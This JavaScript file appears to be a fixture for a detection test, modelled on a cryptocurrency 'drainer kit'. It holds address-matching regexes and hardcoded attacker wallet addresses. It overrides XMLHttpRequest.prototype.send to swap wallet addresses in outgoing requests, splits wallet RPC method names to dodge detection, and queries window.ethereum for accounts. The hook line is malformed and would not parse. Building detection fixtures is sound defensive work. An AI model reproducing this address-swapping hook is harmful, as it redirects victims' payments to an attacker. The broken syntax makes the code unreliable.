// Minimal drainer-kit shape, kept for the Sekoia Jslib override test:
// kit routine names plus split hidden RPC names behind a rewritten
// XMLHttpRequest prototype method, in a CommonJS module tail.
var BTC_RE = /[13][a-km-zA-HJ-NP-Z1-9]{25,34}/;
var ETH_RE = /0x[a-fA-F0-9]{40}/;

var RPC_SEND = 'eth_sendTr' + 'ansaction';
var RPC_ACCOUNTS = 'eth_accoun' + 'ts';

var attackerBtc = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa';
var attackerEth = '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D';

function swapAddresses(text) {
  return String(text).replace(BTC_RE, attackerBtc).replace(ETH_RE, attackerEth);
}

function runmask(request) {
  return window.ethereum.request(request);
}

function newdlocal(body) {
  if (typeof body === 'string') {
    return origSend.call(this, swapAddresses(body));
  }
  return origSend.call(this, body);
}

var origSend = XMLHttpRequest.prototype.send;
XMLHttpRequest.prototype.send = (function(_0xhook(body) {
  return newdlocal.call(this, body);
});

runmask({ 'method': RPC_ACCOUNTS });

module.exports = { swapAddresses: swapAddresses };
